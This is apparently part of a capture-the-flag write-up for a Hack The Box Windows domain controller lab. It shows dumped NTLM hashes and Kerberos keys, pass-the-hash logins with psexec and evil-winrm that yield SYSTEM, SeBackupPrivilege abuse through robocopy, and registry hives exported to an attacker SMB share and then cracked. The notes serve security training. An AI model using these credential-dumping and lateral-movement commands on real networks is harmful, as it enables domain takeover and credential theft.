[*] PEK # 0 found and decrypted: f954f575c626d6afe06c2b80cc2185e6
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
CICADA-DC$:1000:aad3b435b51404eeaad3b435b51404ee:188c2f3cb7592e18d1eae37991dee696:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3779000802a4bb402736bee52963f8ef:::
cicada.htb\john.smoulder:1104:aad3b435b51404eeaad3b435b51404ee:0d33a055d07e231ce088a91975f28dc4:::
cicada.htb\sarah.dantelia:1105:aad3b435b51404eeaad3b435b51404ee:d1c88b5c2ecc0e2679000c5c73baea20:::
cicada.htb\michael.wrightson:1106:aad3b435b51404eeaad3b435b51404ee:b222964c9f247e6b225ce9e7c4276776:::
cicada.htb\david.orelious:1108:aad3b435b51404eeaad3b435b51404ee:ef0bcbf3577b729dcfa6fbe1731d5a43:::
cicada.htb\emily.oscars:1601:aad3b435b51404eeaad3b435b51404ee:559048ab2d168a4edf8e033d43165ee5:::
[*] Kerberos keys from ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:e47fd7646fa8cf1836a79166f5775405834e2c060322d229bc93f26fb67d2be5
Administrator:aes128-cts-hmac-sha1-96:f51b243b116894bea389709127df1652
Administrator:des-cbc-md5:c8838c9b10c43b23
CICADA-DC$:aes256-cts-hmac-sha1-96:e9752f2c7752bd92142588e63dc0383499f49b04a46de37845e33d40de1db7ed
CICADA-DC$:aes128-cts-hmac-sha1-96:7fc8e7f2daa14d0ccdf070de9cfc49c5
CICADA-DC$:des-cbc-md5:b0f7cdec040d5b6d
krbtgt:aes256-cts-hmac-sha1-96:357f15dd4d315af47ac63658c444526ec0186f066ad9efb46906a7308b7c60c8
krbtgt:aes128-cts-hmac-sha1-96:39cbc0f220550c51fb89046ac652849e
krbtgt:des-cbc-md5:73b6c419b3b9bf7c
cicada.htb\john.smoulder:aes256-cts-hmac-sha1-96:57ae6faf294b7e6fbd0ce5121ac413d529ae5355535e20739a19b6fd2a204128
cicada.htb\john.smoulder:aes128-cts-hmac-sha1-96:8c0add65bd3c9ad2d1f458a719cfda81
cicada.htb\john.smoulder:des-cbc-md5:f1feaeb594b08575
cicada.htb\sarah.dantelia:aes256-cts-hmac-sha1-96:e25f0b9181f532a85310ba6093f24c1f2f10ee857a97fe18d716ec713fc47060
cicada.htb\sarah.dantelia:aes128-cts-hmac-sha1-96:2ac9a92bca49147a0530e5ce84ceee7d
cicada.htb\sarah.dantelia:des-cbc-md5:0b5b014370fdab67
cicada.htb\michael.wrightson:aes256-cts-hmac-sha1-96:d89ff79cc85032f27499425d47d3421df678eace01ce589eb128a6ffa0216f46
cicada.htb\michael.wrightson:aes128-cts-hmac-sha1-96:f1290a5c4e9d4ef2cd7ad470600124a9
cicada.htb\michael.wrightson:des-cbc-md5:eca8d532fd8f26bc
cicada.htb\david.orelious:aes256-cts-hmac-sha1-96:125726466d0431ed1441caafe8c0ed9ec0d10b0dbaf4fec7a184b764d8a36323
cicada.htb\david.orelious:aes128-cts-hmac-sha1-96:ce66c04e5fd902b15f5d4c611927c9c2
cicada.htb\david.orelious:des-cbc-md5:83585bc41573897f
cicada.htb\emily.oscars:aes256-cts-hmac-sha1-96:4abe28adc1d16373f4c8db4d9bfd34ea1928aca72cb69362d3d90f69d80c000f
cicada.htb\emily.oscars:aes128-cts-hmac-sha1-96:f98d74d70dfb68b70ddd821edcd6a023
cicada.htb\emily.oscars:des-cbc-md5:fd4a5497d38067cd
[*] Cleaning up...


---OUTPUT-2---
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up...
```
	- We get hashes of all users, more specifically the Administrator
- We login with Admin credentials using Pass the Hash
	```bash
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341 administrator@10.10.11.35

--OR--

evil-winrm -u 'administrator' -H '2b87e7c93a3e8a0ea4a581937016f341' -i 10.10.11.35

---OUTPUT-PSEXEC---
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.11.35.....
[*] Found writable share ADMIN$
[*] Uploading file VFfdhQkU.exe
[*] Opening SVCManager on 10.10.11.35.....
[*] Creating service PeOt on 10.10.11.35.....
[*] Starting service PeOt.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.2700]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

---OUTPUT-WINRM---
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
cicada\administrator
```
	- We also see a krbtgt ticket and could possible try Golden Ticket to login also.
## Alternate method (robocopy)
- We can use robocopy also to exploit SeBackupPrivilege to grab the root flag by backing up the Administrator Desktop folder
	```bash
mkdir C:\temp\robocopy
cd robocopy
robocopy /b C:\\users\\administrator\\desktop C:\\temp\\robocopy
dir
---OUTPUT-DIR---
    Directory: C:\temp\robocopy


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         4/22/2025   8:45 AM             34 root.txt
```
	- We can read the root flag without even logging in as root
## Extra
- While using diskshadow, we can also simply make a textfile with vss.dsh content (say 'diskshadow.txt') and then pass `unix2dos` command on it in our Kali machineto convert it and then send it to target
## Alternate priv esc (unstable, may not always work)
- Ippsec uses impacket-Reg command too the backup registry and it times out but if it collects enough data it may be able to crack the pwd
	- Make smb server share:
		```bash
impacket-smbserver -smb2support share $(pwd)

---OUTPUT---
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.11.35,63297)
[*] AUTHENTICATE_MESSAGE (\,CICADA-DC)
[*] User CICADA-DC\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:share)
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:share)
[*] Closing down connection (10.10.11.35,63297)
[*] Remaining connections []
```
- Backup SAM and SYSTEM files
	```bash
impacket-reg 'cicada.htb/emily.oscars:Q!3@Lp#M6b*7t*Vt'@10.10.11.35 backup -o //10.10.14.25/share

---OUTPUT---
/usr/share/doc/python3-impacket/examples/reg.py:195: SyntaxWarning: invalid escape sequence '\S'
  for hive in ["HKLM\SAM", "HKLM\SYSTEM", "HKLM\SECURITY"]:
/usr/share/doc/python3-impacket/examples/reg.py:195: SyntaxWarning: invalid escape sequence '\S'
  for hive in ["HKLM\SAM", "HKLM\SYSTEM", "HKLM\SECURITY"]:
/usr/share/doc/python3-impacket/examples/reg.py:195: SyntaxWarning: invalid escape sequence '\S'
  for hive in ["HKLM\SAM", "HKLM\SYSTEM", "HKLM\SECURITY"]:
/usr/share/doc/python3-impacket/examples/reg.py:220: SyntaxWarning: invalid escape sequence '\%'
  outputFileName = "%s\%s.save" % (self.__options.outputPath, subKey)
/usr/share/doc/python3-impacket/examples/reg.py:221: SyntaxWarning: invalid escape sequence '\S'
  logging.debug("Dumping %s, be patient it can take a while for large hives (e.g. HKLM\SYSTEM)" % keyName)
/usr/share/doc/python3-impacket/examples/reg.py:597: SyntaxWarning: invalid escape sequence '\s'
  save_parser.add_argument('-o', dest='outputPath', action='store', metavar='\\\\192.168.0.2\share', required=True, help='Output UNC path the target system must export the registry saves to')
/usr/share/doc/python3-impacket/examples/reg.py:600: SyntaxWarning: invalid escape sequence '\S'
  backup_parser = subparsers.add_parser('backup', help='(special command) Backs up HKLM\SAM, HKLM\SYSTEM and HKLM\SECURITY to a specified file.')
/usr/share/doc/python3-impacket/examples/reg.py:601: SyntaxWarning: invalid escape sequence '\s'
  backup_parser.add_argument('-o', dest='outputPath', action='store', metavar='\\\\192.168.0.2\share', required=True,
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[!] Cannot check RemoteRegistry status. Triggering start trough named pipe...
[*] Saved HKLM\SAM to //10.10.14.25/share\SAM.save
[*] Saved HKLM\SYSTEM to //10.10.14.25/share\SYSTEM.save
[*] Saved HKLM\SECURITY to //10.10.14.25/share\SECURITY.save
```
- We crack the files (don't really require Security file i think but we use it):
	```bash
impacket-secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL

---OUTPUT---
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:6209748a5ab74c44bd98fc5015b6646467841a634c4a1b2d6733289c33f76fc6427f7ccd8f6d978a79eec3ae49eb8c0b5b14e193ec484ea1152e8a04e01a3403b3111c0373d126a566660a7dd083aec1921d53a82bc5129408627ae5be5e945ed58cfb77a2a50e9ffe7e6a4531febd965181e528815d264885921118fb7a74eff51306dbffa4d6a0c995be5c35063576fc4a3eba39d0168d4601da0a0c12748ae870ff36d7fb044649032f550f04c017f6d94675b3517d06450561c71ddf8734100898bf2c19359c69d1070977f070e3b8180210a92488534726005588c0f269a7e182c3c04b96f7b5bc4af488e128f8
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:188c2f3cb7592e18d1eae37991dee696
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x0e3d4a419282c47327eb03989632b3bef8998f71
dpapi_userkey:0x4bb80d985193ae360a4d97f3ca06350b02549fbb
[*] NL$KM 
 0000   CC 15 01 F7 64 39 1E 7A  5E 53 8C C1 74 E6 2B 01   ....d9.z^S..t.+.
 0010   36 9B 50 B8 D0 72 23 D9  B6 C5 6E 92 2F 57 08 D8   6.P..r#...n./W..
 0020   1E BA 8E 81 23 25 03 27  36 4C 19 B4 96 CD 25 1F   ....#%.'6L....%.
 0030   8F F9 7F 5D 71 E6 6E 8C  FF CB EB 5E 4E A4 E6 96   ...]q.n....^N...
NL$KM:cc1501f764391e7a5e538cc174e62b01369b50b8d07223d9b6c56e922f5708d81eba8e8123250327364c19b496cd251f8ff97f5d71e66e8cffcbeb5e4ea4e696
[*] Cleaning up...
```
-------
--------